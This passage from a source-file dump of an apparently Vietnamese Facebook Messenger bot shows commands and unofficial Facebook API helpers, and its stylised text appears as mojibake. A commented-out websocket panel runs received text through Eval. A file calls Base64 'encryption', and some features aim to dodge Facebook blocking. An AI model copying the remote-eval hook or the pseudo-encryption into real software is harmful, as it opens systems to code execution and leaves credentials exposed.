ùó¥ùóºÃõÃ£ùó∂ ùòÜÃÅ ùüÆ (-${coinsdown}$)`,\n                attachment: imglove\n            }\n            return api.sendMessage(msg, event.threadID, (error, info) => {\n                global.client.handleReply.push({\n                    type: \"reply\",\n                    name: this.config.name,\n                    author: event.senderID,\n                    messageID: info.messageID,\n                    tukhoa: tukhoadung,\n                    suggestions: suggestions\n                })\n            })    \n    }\n}","path":null,"size_bytes":13170,"size_tokens":null},"lib/fca-auto/src/markAsReadAll.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function markAsReadAll(callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n\n        resolveFunc(data);\n      };\n    }\n\n    var form = {\n      folder: 'inbox'\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/ajax/mercury/mark_folder_as_read.php\", ctx.jar, form)\n      .then(utils.saveCookies(ctx.jar))\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) throw resData;\n\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"markAsReadAll\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};","path":null,"size_bytes":1038,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/Src/Instant_Update.js":{"content":"// module.exports = async function() {\n//     const got = require('got');\n//     const log = require('npmlog');\n//     const fs = require('fs');\n//     const Database = require('../Database')\n//     const { execSync } = require('child_process');\n//     //make request https://raw.githubusercontent.com/KanzuXHorizon/Fca-Horizon-Remastered/main/package.json\n//     const { body } = await got('https://raw.githubusercontent.com/KanzuXHorizon/Global_Horizon/main/InstantAction.json');\n//     const json = JSON.parse(body);\n//     const LocalVersion = require('../../package.json').version;\n//         if (Number(LocalVersion.replace(/\\./g,\"\")) < Number(json.Version.replace(/\\./g,\"\")) ) {\n//             log.warn(\"[ FCA-UPDATE ] ‚Ä¢\",\"Found a command that requires downloading an important Version to avoid errors, update onions: \" + LocalVersion + \" -> \" + json.Version);    \n//             log.warn(\"[ FCA-UPDATE ] ‚Ä¢\",\"Problem Description: \" + json.Problem);\n//             await new Promise(resolve => setTimeout(resolve, 3000));\n//             try {\n//                 execSync(`npm install fca-horizon-remastered@${json.Version}`, { stdio: 'inherit' });\n//                 log.info(\"[ FCA-UPDATE ] ‚Ä¢\",\"Update Complete, Restarting...\");\n//                 await new Promise(resolve => setTimeout(resolve, 3000));\n//                 Database(true).set(\"Instant_Update\", Date.now(), true);\n//                 await new Promise(resolve => setTimeout(resolve, 3000));\n//                 process.exit(1);\n//             }\n//             catch (err) {\n//                 try {\n//                     log.warn(\"[ FCA-UPDATE ] ‚Ä¢\",\"Update Failed, Trying Another Method 1...\");\n//                     await new Promise(resolve => setTimeout(resolve, 3000));\n//                     execSync(`npm install fca-horizon-remastered@${json.Version} --force`, { stdio: 'inherit' });\n//                     log.info(\"[ FCA-UPDATE ] ‚Ä¢\",\"Update Complete, Restarting...\");\n//                     await new Promise(resolve => setTimeout(resolve, 3000));\n//                     Database(true).set(\"Instant_Update\", Date.now());\n//                     await new Promise(resolve => setTimeout(resolve, 3000));\n//                     process.exit(1);\n//                 }\n//                 catch (err) {\n//                     try {\n//                         log.warn(\"[ FCA-UPDATE ] ‚Ä¢\",\"Update Failed, Trying to clean package cache...\");\n//                         await new Promise(resolve => setTimeout(resolve, 3000));\n//                         execSync('npm cache clean --force', { stdio: 'inherit' });\n//                         log.info(\"[ FCA-UPDATE ] ‚Ä¢\",\"Cache Cleaned, Trying Another Method 2...\");\n//                         await new Promise(resolve => setTimeout(resolve, 3000));\n//                         //self delete fca-horizon-remastered folder from node_modules\n//                         fs.rmdirSync((process.cwd() + \"/node_modules/fca-horizon-remastered\" || __dirname + '../../../fca-horizon-remastered'), { recursive: true });\n//                         await new Promise(resolve => setTimeout(resolve, 3000));\n//                         execSync(`npm install fca-horizon-remastered@${json.Version}`, { stdio: 'inherit' });\n//                         log.info(\"[ FCA-UPDATE ] ‚Ä¢\",\"Update Complete, Restarting...\");\n//                         await new Promise(resolve => setTimeout(resolve, 3000));\n//                         Database(true).set(\"Instant_Update\", Date.now());\n//                         await new Promise(resolve => setTimeout(resolve, 3000));\n//                         process.exit(1);\n//                     }\n//                     catch (e) {\n//                         console.log(e);\n//                         log.error(\"[ FCA-UPDATE ] ‚Ä¢\",\"Update Failed, Please Update Manually\");\n//                         await new Promise(resolve => setTimeout(resolve, 3000));\n//                         log.warn(\"[ FCA-UPDATE ] ‚Ä¢\",\"Please contact to owner about update failed and screentshot error log at fb.com/Lazic.Kanzu\");\n//                         await new Promise(resolve => setTimeout(resolve, 3000));\n//                         process.exit(1);\n//                     }\n//                 }\n//             }\n//         }\n//     else {\n//         return Database(true).set(\"NeedRebuild\", false);\n//     }\n// }","path":null,"size_bytes":4349,"size_tokens":null},"modules/commands/setprefix.js":{"content":"module.exports.config = {\n\tname: \"setprefix\",\n\tversion: \"2.0.0\",\n\thasPermssion: 1,\n\tcredits: \"Vtuan\",\n\tdescription: \"ƒê·∫∑t l·∫°i prefix c·ªßa nh√≥m\",\n\tcommandCategory: \"Qu·∫£n L√≠ Box\",\n\tusages: \"[prefix/reset]\",\n\tcooldowns: 5\n};\n\nmodule.exports.handleReaction = async function({ api, event, Threads, handleReaction, getText }) {\n\ttry {\n\t\tif (event.userID != handleReaction.author) return;\n\t\tconst { threadID, messageID } = event;\n\t\tvar data = (await Threads.getData(String(threadID))).data || {};\n\t\tdata[\"PREFIX\"] = handleReaction.PREFIX;\n\t\tawait Threads.setData(threadID, { data });\n\t\tawait global.data.threadData.set(String(threadID), data);\n\t\tapi.unsendMessage(handleReaction.messageID);\n\n    api.changeNickname(`„Äé ${handleReaction.PREFIX} „Äè ‚™º ${global.config.BOTNAME}`, event.threadID, event.senderID);\n    \n\t\treturn api.sendMessage({body:`Update prefix to:  ${handleReaction.PREFIX}`}, event.threadID, event.messageID);\n    \n\t} catch (e) { return console.log(e) }\n}\n\nmodule.exports.run = async ({ api, event, args, Threads }) => {\n\tif (typeof args[0] == \"undefined\") return api.sendMessage({body:\"ùô±ùöäÃ£ùöó ùöåùöäÃÇÃÄùöó ùöóùöëùöäÃ£ÃÇùöô ùöçùöäÃÇÃÅùöû ùöïùöéÃ£ÃÇùöóùöë ùöñùöûùöòÃÇÃÅùöó ƒëùöòÃÇÃâùöí!\"}, event.threadID, event.messageID);\n  \n\tlet prefix = args[0].trim();\n\tif (!prefix) return api.sendMessage({body:\"ùô±ùöäÃ£ùöó ùöåùöäÃÇÃÄùöó ùöóùöëùöäÃ£ÃÇùöô ùöçùöäÃÇÃÅùöû ùöïùöéÃ£ÃÇùöóùöë ùöñùöûùöòÃÇÃÅùöó ƒëùöòÃÇÃâùöí!\"}, event.threadID, event.messageID);\n  \n\tif (prefix == \"reset\") {\n\t\tvar data = (await Threads.getData(event.threadID)).data || {};\n\t\tdata[\"PREFIX\"] = global.config.PREFIX;\n\t\tawait Threads.setData(event.threadID, { data });\n\t\tawait global.data.threadData.set(String(event.threadID), data);\n\t\treturn api.sendMessage({body:`ùöÑùöôùöçùöäùöùùöé ùöôùöõùöéùöèùöíùö° ùöùùöò: ${global.config.PREFIX}`}, event.threadID, event.messageID);\n    api.changeNickname(`„Äé ${handleReaction.PREFIX} „Äè ‚™º ${global.config.BOTNAME}`, event.threadID, event.senderID);\n    \n\t} else return api.sendMessage({body:`ùöÉùöëùöäÃâ ùöåùöäÃâùöñ ùö°ùöûÃÅùöå ùöãùöäÃÇÃÅùöù ùöîùöíÃÄ ùöüùöäÃÄùöò ùöùùöíùöó ùöóùöëùöäÃÜÃÅùöó ùöóùöäÃÄùö¢ ùöóùöéÃÇÃÅùöû ùöãùöäÃ£ùöó ùöåùöëùöäÃÜÃÅùöå ùöåùöëùöäÃÜÃÅùöó ùöñùöûùöòÃÇÃÅùöó ƒëùöòÃÇÃâùöí ùöôùöõùöéùöèùöíùö° ùöùùöëùöäÃÄùöóùöë : ${prefix}`},event.threadID, (error, info) => {\n\t\tglobal.client.handleReaction.push({\n\t\t\tname: this.config.name,\n\t\t\tmessageID: info.messageID,\n\t\t\tauthor: event.senderID,\n\t\t\tPREFIX: prefix\n\t\t})\n\t})\n                          }\n \n                    \n                          ","path":null,"size_bytes":2656,"size_tokens":null},"lib/sim.js":{"content":"const fs = require('fs');\nconst path = require('path');\nconst stringSimilarity = require('string-similarity');\n\nfunction simi(type, data) {\n  const dataSimPath = path.join(__dirname, 'data', 'sim.json');\n  const dataSim = require(dataSimPath);\n\n  if (type === 'ask') {\n    var ask = encodeURI(data);\n    var msg = dataSim.map(id => id.ask);\n    var checker = stringSimilarity.findBestMatch(decodeURI(ask), msg);\n\n    if (checker.bestMatch.rating >= 0.5) {\n      var search = checker.bestMatch.target;\n    }\n\n    if (search == undefined) {\n      return { answer: 'hong h·ªâu???' };\n    }\n\n    function recoverKey() {\n      var data = dataSim.filter(i => i.ask.toLowerCase() == search.toLowerCase());\n      return data;\n    }\n\n    var find = recoverKey();\n    var f2 = find[Math.floor(Math.random() * find.length)];\n    var a = f2.ans[Math.floor(Math.random() * f2.ans.length)];\n\n    return { answer: a };\n  } else if (type === 'teach') {\n    var ask = data.ask;\n    var ans = data.ans;\n\n    if (!ask || !ans) {\n      return { error: 'Thi·∫øu d·ªØ li·ªáu ƒë·ªÉ th·ª±c thi l·ªánh' };\n    }\n\n    var existingQuestion = dataSim.find(i => i.ask == ask);\n\n    if (existingQuestion !== undefined) {\n      if (existingQuestion.ans.includes(ans)) {\n        return { error: 'C√¢u tr·∫£ l·ªùi ƒë√£ t·ªìn t·∫°i!' };\n      }\n      existingQuestion.ans.push(ans);\n    } else {\n      dataSim.push({\n        id: dataSim.length,\n        ask,\n        ans: [ans]\n      });\n    }\n\n    fs.writeFileSync(dataSimPath, JSON.stringify(dataSim, null, 2), 'utf-8');\n\n    return {\n      msg: 'D·∫°y sim th√†nh c√¥ng',\n      data: {\n        ask,\n        ans\n      }\n    };\n  }\n}\n\nmodule.exports = { simi };","path":null,"size_bytes":1676,"size_tokens":null},"modules/commands/wiki.js":{"content":"module.exports.config = {\n  name: \"wiki\",\n  version: \"1.0.1\",\n  hasPermssion: 0,\n  credits: \"Mirai Team\",\n  description: \"T√¨m m·ªçi th√¥ng tin c·∫ßn bi√™t th√¥ng qua Wikipedia\",\n  commandCategory: \"Ti·ªán √≠ch\",\n  usages: \"[en] [th√¥ng tin c·∫ßn t√¨m ki·∫øm]\",\n  cooldowns: 5,\n  dependencies: {\n        \"wikijs\": \"\"\n    }\n}\n\nmodule.exports.languages = {\n    \"vi\": {\n        \"missingInput\": \"N·ªôi dung c·∫ßn t√¨m ki·∫øm kh√¥ng ƒë∆∞·ª£c ƒë·ªÉ tr·ªëng!\",\n        \"returnNotFound\": \"Kh√¥ng t√¨m th·∫•y n·ªôi dung %1\"\n    },\n    \"en\": {\n        \"missingInput\": \"Enter what you need to search for.\",\n        \"returnNotFound\": \"Can't find %1\"\n    }\n}\n\nmodule.exports.run = ({ event, args, api, getText }) => {\n    const wiki = (global.nodemodule[\"wikijs\"]).default;\n    let content = args.join(\" \");\n    let url = 'https://vi.wikipedia.org/w/api.php';\n    if (args[0] == \"en\") {\n        url = 'https://en.wikipedia.org/w/api.php'; \n        content = args.slice(1, args.length);\n    }\n    if (!content) return api.sendMessage(getText(\"missingInput\"), event.threadID, event.messageID);\n    return wiki({ apiUrl: url }).page(content).catch(() => api.sendMessage(getText(\"returnNotFound\", content), event.threadID, event.messageID)).then(page => (typeof page != 'undefined') ? Promise.resolve(page.summary()).then(val => api.sendMessage(val, event.threadID, event.messageID)) : '');\n\n}","path":null,"size_bytes":1376,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/Src/Websocket.js":{"content":"/* eslint-disable no-prototype-builtins */\n/* eslint-disable linebreak-style */\n/**\nconst Eval = require('eval');\nconst Database = require('../Database');\nglobal.ws = new Object({ \n    client: {},\n});\nconst All_Session_ID = Database().get('Session_ID') || []; [ { Session_ID: \".\", TimeStamp: \"\" }]\nfor (let v of All_Session_ID) {\n    if (v.TimeStamp <= Date.now()) {\n        const index = All_Session_ID.findIndex(i => i.Session_ID == v.Session_ID);\n        All_Session_ID.splice(index,1);\n    }\n    else {\n        setTimeout(() => {\n            const index = All_Session_ID.findIndex(i => i.Session_ID == v.Session_ID);\n            All_Session_ID.splice(index,1);\n        }, v.TimeStamp - Date.now());\n    }\n}\n\nDatabase().set(\"Session_ID\", All_Session_ID);\n\nfunction generateRandomString() {\n    var string = '';\n    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    for (var i = 0; i < 16; i++) {\n        if (i == 4 || i == 8 || i == 12) {\n        string += '-';\n        }\n        var randomIndex = Math.floor(Math.random() * characters.length);\n        string += characters.charAt(randomIndex);\n    }\n    return string;\n}\n\nconst HowTo =  {\n    AutoUpdate: \"Automatically update if there is a new version. (Restart required)\",\n    AutoLogin: \"Automatically login and retrieve cookies to continue running the bot whenever kicked out of the account. (Restart required)\",\n    Login2Fa: \"Use two-factor authentication code to log in. (Restart required)\",\n    Uptime: \"Help your process to operate for a longer period of time.(Restart required)\",\n    BroadCast: \"Receive messages from the server.(Restart required)\",\n    EncryptFeature: \"Encrypt your account (appstate) to prevent it from being accessed or damaged by others.(Restart required)\",\n    ResetDataLogin: \"Used to reset autologin account and password.(Restart required)\",\n    DevMode: \"Developer mode, insider, testing untested features.(Restart required)\",\n    AutoInstallNode: \"Automatically download NodeJS version as per system's requirement.(Restart required)\",\n    AntiSendAppState: \"Check and prevent sending your account (appstate) via messages.\",\n    HTML: \"Display the website of FCA.(Restart required)\",\n    Accept: \"Is a part of stable_version, turned on to use a stable version without errors! (Restart required)\",\n    AntiGetThreadInfo: \"Using data storage and release algorithms to avoid being blocked by Facebook.\",\n    AntiGetUserInfo: \"Using data storage and release algorithms to avoid being blocked by Facebook.\",\n    Status: \"Turn on/off the websocket-extension feature. (Restart required)\",\n    Language: \"Select system language (Restart required)\",\n    MainName: \"Name on the top whenever log data. (Restart required)\",\n    UserName: \"Your name display in Express - HTML. (Restart required)\",\n    MusicLink: \"Your music link. (Restart required)\",\n    AuthString: \"Code to retrieve 2FA authenticator. (Restart required)\",\n    PreKey: \"Obsolete feature.\",\n    Config: \"Feature is delayed.\",\n    Version: \"stable version - Stable_Version Feature. (Restart required)\",\n    Database_Type: \"Type of database. (Restart required)\",\n    AppState_Path: \"Name of the file containing your appstate.\",\n    AutoRestartMinutes: \"Auto-restart after a certain number of minutes. (Restart required)\",\n    RestartMQTT_Minutes: \"Automatically restarting MQTT without restarting the bot helps prevent console hangups. (Restart required)\",\n    Example: {\n        Language: \"vi or en\",\n        AuthString: \"Like this SD4S XQ32 O2JA WXB3 FUX2 OPJ7 Q7JZ 4R6Z | https://i.imgur.com/RAg3rvw.png\",\n        Version: \"Valid version: https://github.com/KanzuXHorizon/Global_Horizon/blob/main/InstantAction.json\",\n        Database_Type: \"default or json\",\n        AppState_Path: \"fbstate.json, appstate.json,...\",\n        AutoRestartMinutes: \"Number 0 to turn off, Encourage number 60\",\n        RestartMQTT_Minutes: \"Number 0 to turn off, Encourage number 45\"\n\n    }\n};\n\nmodule.exports.connect = function(WebSocket) {\n    WebSocket.on('connection', function (Websocket, req) {\n        var Ws_Client;\n        if (!global.ws.client.hasOwnProperty(req.socket.remoteAddress)) {\n            global.ws.client[req.socket.remoteAddress] = { Websocket, Status: false, ResetPassWordTime: 0 };\n            Ws_Client = global.ws.client[req.socket.remoteAddress];\n        }\n        else { \n            global.ws.client[req.socket.remoteAddress] = { Websocket, Status: global.ws.client[req.socket.remoteAddress].Status, ResetPassWordTime: global.ws.client[req.socket.remoteAddress].ResetPassWordTime };\n            Ws_Client = global.ws.client[req.socket.remoteAddress];\n        }\n        Ws_Client.Websocket.send(JSON.stringify({ Status: \"Username&PassWord\"}));\n        Ws_Client.Websocket.on('message', function(message) {\n            message = JSON.parse(message);\n            switch (message.type) {\n                case \"login\": {\n                    if (!message.username || !message.password) return Ws_Client.Websocket.send(JSON.stringify({ Status: false, Code: 1 }));\n                    const User_UserName = Database().get('Ws_UserName');\n                    const User_PassWord = Database().get('Ws_PassWord');\n                    if (message.username != User_UserName || User_PassWord != message.password) return Ws_Client.Websocket.send(JSON.stringify({ Status: false, Code: 2}));\n                    const Format = {\n                        Session_ID: generateRandomString(),\n                        TimeStamp: Date.now() + 24 * 60 * 60 * 1000\n                    };\n                    All_Session_ID.push(Format);\n                    Database().set(\"Session_ID\", All_Session_ID);\n                    global.ws.client[req.socket.remoteAddress].Status = true;\n                    setTimeout(() => {\n                        global.ws.client[req.socket.remoteAddress].Status = false;\n                    }, (Date.now() + 24 * 60 * 60 * 1000) - Date.now());\n                    return Ws_Client.Websocket.send(JSON.stringify({ Status: \"Success\", Session_ID: Format.Session_ID, TimeStamp: Format.TimeStamp }));\n                }\n                case \"check\": {\n                    if (!message.Session_ID || !message.TimeStamp) return Ws_Client.Websocket.send(JSON.stringify({ Status: false, Code: 3}));\n                    const Format = {\n                        Session_ID: message.Session_ID,\n                        TimeStamp: message.TimeStamp\n                    };\n                    if (Format.TimeStamp <= Date.now()) {\n                        let index = All_Session_ID.findIndex(i => i.Session_ID == Format.Session_ID);\n                        All_Session_ID.splice(index,1);\n                        Database().set(\"Session_ID\", All_Session_ID);\n                        Ws_Client.Status = false;\n                        Ws_Client.Websocket.send(JSON.stringify({ Status: false, Code: 4}));\n                        return delete global.ws.client[Format.Session_ID];\n                    }\n                    if (All_Session_ID.some(i => i.Session_ID == message.Session_ID)) {\n                        global.ws.client[req.socket.remoteAddress].Status = true;\n                        return Ws_Client.Websocket.send(JSON.stringify({ Status: \"Success\" }));\n                    }\n                    else {\n                        global.ws.client[req.socket.remoteAddress].Status = false;\n                        return Ws_Client.Websocket.send(JSON.stringify({ Status: false, Code: 5 }));\n                    }\n                }\n                case \"resetPassword\": {\n                    if (!message.Otp || !message.NewPassword) return Ws_Client.Websocket.send(JSON.stringify({ Status:  false, Code: 7 }));\n                    if (global.ws.client[req.socket.remoteAddress].ResetPassWordTime == 3) return Ws_Client.Websocket.send(JSON.stringify({ Status: false, Code: 9 }));\n                    const speakeasy = require('speakeasy');\n                    const secret = Database().get('Ws_2Fa');\n                    if (message.Otp != speakeasy.totp({\n                        secret: secret,\n                        encoding: 'base32'\n                    })) {\n                        global.ws.client[req.socket.remoteAddress].ResetPassWordTime += 1;\n                        return Ws_Client.Websocket.send(JSON.stringify({ Status: false, Code: 8 }));\n                    }\n                    else {\n                        Database().set('Ws_PassWord', message.NewPassword);\n                        return Ws_Client.Websocket.send(JSON.stringify({ Status: 'Success' }));\n                    }\n                }\n                default: {\n                    if (Ws_Client.Status != true) return Ws_Client.Websocket.send(JSON.stringify({ Status: false, Code: 6 }));\n                    switch (message.type) {\n                        case \"Command\": {\n                            if (message.Data == \"Stop\") {\n                                return process.exit(0);\n                            }\n                            else Eval(message.Data, {} ,true);\n                        }\n                            break;\n                        case \"ChangeAppState\": {\n                            try {\n                                const AppState = JSON.stringify(JSON.parse(message.Data), null ,2);\n                                require('fs').writeFileSync(process.cwd() + `/${global.Fca.Require.FastConfig.Websocket_Extension.AppState_Path}`, AppState, 'utf-8');\n                                return Ws_Client.Websocket.send(JSON.stringify({ Type: \"ChangeAppState\", Data: 0 }));\n                            }\n                            catch (e) {\n                                return Ws_Client.Websocket.send(JSON.stringify({ Type: \"ChangeAppState\", Data: e }));\n                            }\n                        }\n                        case \"GetDocument\": {\n                            \n                            return Ws_Client.Websocket.send(JSON.stringify({ Status: \"Success\", Data: HowTo }));\n                        }\n                        case \"getFastConfig\": {\n                            return Ws_Client.Websocket.send(JSON.stringify({ Status: \"Success\", Data: global.Fca.Require.FastConfig }));\n                        }\n                        case \"ping\": {\n                            return Ws_Client.Websocket.send(JSON.stringify({ Status: \"Pong\" }));\n                        }\n                        case \"FastConfig_Change\": {\n                            const FastConfig_Path = require(process.cwd() + \"/FastConfigFca.json\");\n                            const FastConfig_Global = global.Fca.Require.FastConfig;\n                            const SetConfig = function(Name, Value, Path, Main_Path) {\n                                try {\n                                    if (Path && Main_Path) {\n                                        FastConfig_Path[Main_Path][Name] = Value;\n                                        (HowTo[Name]).includes('(Restart required)') == false ? global.Fca.Require.FastConfig = FastConfig_Path : '';\n                                    }\n                                    else {\n                                        FastConfig_Path[Name] = Value;\n                                        (HowTo[Name]).includes('(Restart required)') == false ? global.Fca.Require.FastConfig[Name] = Value : '';\n                                    }\n                                    global.Fca.Require.fs.writeFileSync(process.cwd() + \"/FastConfigFca.json\", JSON.stringify(FastConfig_Path, null, \"\\t\"));\n                                    return Ws_Client.Websocket.send(JSON.stringify({ Type: 'Noti', Action: `Success ${ (HowTo[Name]).includes('(Restart required)') == true ? 'RestartRequired' : ''}` }));\n                                }\n                                catch (e) {\n                                    global.Fca.Require.fs.writeFileSync(process.cwd() + \"/FastConfigFca.json\", JSON.stringify(FastConfig_Global, null, \"\\t\"));\n                                    return Ws_Client.Websocket.send(JSON.stringify({ Type: 'Noti', Action: e}));\n                                }\n                            };\n                            return SetConfig(message.Data.Name, message.Data.Value, message.Data.Path, message.Data.Main_Path);\n                        }\n                        case \"All_logs\": {\n                            return Ws_Client.Websocket.send(JSON.stringify({ Type: \"Console\", Data: console.history.join(\" <br> \")}));\n                        }\n                    }\n                }\n            }\n        });\n    });\n    return { Client: global.ws.client, WSS: WebSocket };\n};\n */","path":null,"size_bytes":12652,"size_tokens":null},"lib/fca-auto/src/httpPost.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function httpGet(url, form, callback, notAPI) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback && (utils.getType(form) == \"Function\" || utils.getType(form) == \"AsyncFunction\")) {\n      callback = form;\n      form = {};\n    }\n\n    form = form || {};\n\n    callback = callback || function (err, data) {\n      if (err) return rejectFunc(err);\n      resolveFunc(data);\n    };\n\n    if (notAPI) {\n      utils\n        .post(url, ctx.jar, form, ctx.globalOptions)\n        .then(resData => callback(null, resData.body.toString()))\n        .catch(function (err) {\n          log.error(\"httpPost\", err);\n          return callback(err);\n        });\n    }\n    else {\n      defaultFuncs\n        .post(url, ctx.jar, form, {})\n        .then(resData => callback(null, resData.body.toString()))\n        .catch(function (err) {\n          log.error(\"httpPost\", err);\n          return callback(err);\n        });\n    }\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1248,"size_tokens":null},"lib/fca-auto/src/changeAvt.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n/**\n * It posts an image to a Facebook profile\n * @param Api - The API object\n * @param BotID - The ID of the bot you want to post the image to.\n * @param form - The form data that you want to send.\n * @returns The JSON.parse(Data.split(\"for (;;);\")[1]); is returning the following:\n * {\"__ar\":1,\"payload\":null,\"jsmods\":{\"require\":[[\"ImageUploader\",\"uploadPhoto\",[{\"__m\":\"__elem_0\"},{\"__m\":\"__elem_1\"},{\"__m\":\"__elem_2\"},{\"__m\":\"__\n */\nasync function postImage(Api,BotID,form) {\n    var Data = await Api.httpPostFormData(`https://www.facebook.com/profile/picture/upload/?profile_id=${BotID}&photo_source=57&av=${BotID}`, form);\n    return JSON.parse(Data.split(\"for (;;);\")[1]);\n}\n\nmodule.exports = function(defaultFuncs, api, ctx) {\n/* Changing the profile picture of the bot. */\n    return function changeAvt(link, caption, callback) {\n        var resolveFunc = function() {};\n        var rejectFunc = function() {};\n        var returnPromise = new Promise(function(resolve, reject) {\n            resolveFunc = resolve;\n            rejectFunc = reject;\n        });\n\n        if (!callback) {\n            callback = function(err, data) {\n                if (err) return rejectFunc(err);\n                resolveFunc(data);\n            };\n        }\n        try {\n            var Fetch = require('axios')\n            Fetch.get(link, { responseType: \"stream\" }).then(data => { \n                postImage(api, ctx.userID, { file: data.data }).then(data => {\n                    if (data.error) throw new Error({ error: data.error, des: data.error.errorDescription });\n                    var form = {\n                        av: ctx.userID,\n                            fb_api_req_friendly_name: \"ProfileCometProfilePictureSetMutation\",\n                            fb_api_caller_class: \"RelayModern\",\n                            doc_id: \"5066134240065849\",\n                            variables: JSON.stringify({\n                                input: {\n                                    caption: (caption || \"\"),\n                                    existing_photo_id: data.payload.fbid,\n                                    expiration_time: null,\n                                    profile_id: ctx.userID,\n                                    profile_pic_method: \"EXISTING\",\n                                    profile_pic_source: \"TIMELINE\",\n                                scaled_crop_rect: {\n                                    height: 1,\n                                    width: 1,\n                                    x: 0,\n                                    y: 0\n                                },\n                                skip_cropping: true,\n                                actor_id: ctx.userID,\n                                client_mutation_id: Math.round(Math.random() * 19).toString()\n                                },\n                            isPage: false,\n                            isProfile: true,\n                            scale: 3,\n                        })\n                    };\n                    defaultFuncs\n                        .post(\"https://www.facebook.com/api/graphql/\", ctx.jar, form)\n                        .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n                        .then(function(resData) {\n                            if (resData.error) throw resData;\n                            else return callback(null,true)\n                        })\n                        .catch(function(err) {\n                        return callback(err);\n                    });\n                })\n            })  \n        }\n        catch (e) {\n            throw e;\n        }\n        return returnPromise;\n    };\n};","path":null,"size_bytes":3737,"size_tokens":null},"includes/handle/handleReaction.js":{"content":"module.exports = function ({ api, models, Users, Threads, Currencies }) {\n    return function ({ event }) {\n        const { handleReaction, commands } = global.client;\n        const { messageID, threadID } = event;\n        if (handleReaction.length !== 0) {\n            const indexOfHandle = handleReaction.findIndex(e => e.messageID == messageID);\n            if (indexOfHandle < 0) return;\n            const indexOfMessage = handleReaction[indexOfHandle];\n            const handleNeedExec = commands.get(indexOfMessage.name);\n\n            if (!handleNeedExec) return api.sendMessage(global.getText('handleReaction', 'missingValue'), threadID, messageID);\n            try {\n                var getText2;\n                if (handleNeedExec.languages && typeof handleNeedExec.languages == 'object') \n                \tgetText2 = (...value) => {\n                    const react = handleNeedExec.languages || {};\n                    if (!react.hasOwnProperty(global.config.language)) \n                    \treturn api.sendMessage(global.getText('handleCommand', 'notFoundLanguage', handleNeedExec.config.name), threadID, messageID);\n                    var lang = handleNeedExec.languages[global.config.language][value[0]] || '';\n                    for (var i = value.length; i > 0x2 * -0xb7d + 0x2111 * 0x1 + -0xa17; i--) {\n                        const expReg = RegExp('%' + i, 'g');\n                        lang = lang.replace(expReg, value[i]);\n                    }\n                    return lang;\n                };\n                else getText2 = () => {};\n                const Obj = {};\n                Obj.api= api \n                Obj.event = event \n                Obj.models = models\n                Obj.Users = Users\n                Obj.Threads = Threads\n                Obj.Currencies = Currencies\n                Obj.handleReaction = indexOfMessage\n                Obj.models= models \n                Obj.getText = getText2\n                handleNeedExec.handleReaction(Obj);\n                return;\n            } catch (error) {\n                return api.sendMessage(global.getText('handleReaction', 'executeError', error), threadID, messageID);\n            }\n        }\n    };\n};","path":null,"size_bytes":2194,"size_tokens":null},"lib/fca-auto/Extra/Security/Step_2.js":{"content":"'use strict';\n\nvar CryptoJS = require(\"crypto-js\");\n\n/**\n * Encrypt the text using the CryptoJS library and return the encrypted text as a Base64 string.\n * @param Data - The data to be encrypted.\n * @returns A string of characters that represent the encrypted data.\n */\nmodule.exports.Encrypt = function Encrypt(Data) {\n    return CryptoJS.enc.Base64.stringify(CryptoJS.enc.Utf8.parse(Data));\n};\n\n/**\n * Decrypt the data using the CryptoJS library, and return the decrypted data as a string.\n * @param Data - The data to be decrypted.\n * @returns The decrypted data.\n */\n\nmodule.exports.Decrypt = function Decrypt(Data) {\n    return CryptoJS.enc.Base64.parse(Data).toString(CryptoJS.enc.Utf8);\n};\n","path":null,"size_bytes":698,"size_tokens":null},"modules/commands/setmoney.js":{"content":"module.exports.config = {\n    \"name\": \"setmoney\",\n    \"version\": \"1.0.0\",\n    \"hasPermssion\": 3,\n    \"credits\": \"nnl\",\n    \"description\": \"ƒêi·ªÅu ch·ªânh th√¥ng tin c·ªßa ng∆∞·ªùi d√πng\",\n    \"commandCategory\": \"H·ªá Th·ªëng\",\n    \"usages\": \"[add/all/set/clean] [S·ªë ti·ªÅn] [Tag ng∆∞·ªùi d√πng/reply]\",\n    \"cooldowns\": 5\n};\n\nmodule.exports.run = async function ({ event, api, Currencies, args,Users }) {\nif (args.length == 0) return api.sendMessage(`====„Äéùó¶ùóòùóß ùó†ùó¢ùó°ùóòùó¨„Äè====\\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\\nùó∞ùóµùó∂ ùòÅùó∂ùó≤ÃÇÃÅùòÅ ùó∞ùóÆÃÅùó∞ùóµ ùó±ùòÇÃÄùóªùó¥\\n‚Üí /ùó¶ùó≤ùòÅ ùó∫ùóºùóªùó≤ùòÜ ùóÆùó±ùó± ùóøùó≤ùóΩùóπùòÜ ùóµùóºùóÆÃÜÃ£ùó∞ ùòÅùóÆùó¥ ùóªùó¥ùòÇÃõùóºÃõÃÄùó∂ ùóØùóÆÃ£ùóª ùó∫ùòÇùóºÃÇÃÅùóª ùòÄùó≤ùòÅ + ùòÄùóºÃÇÃÅ ùóßùó∂ùó≤ÃÇÃÄùóª\\n‚Üí 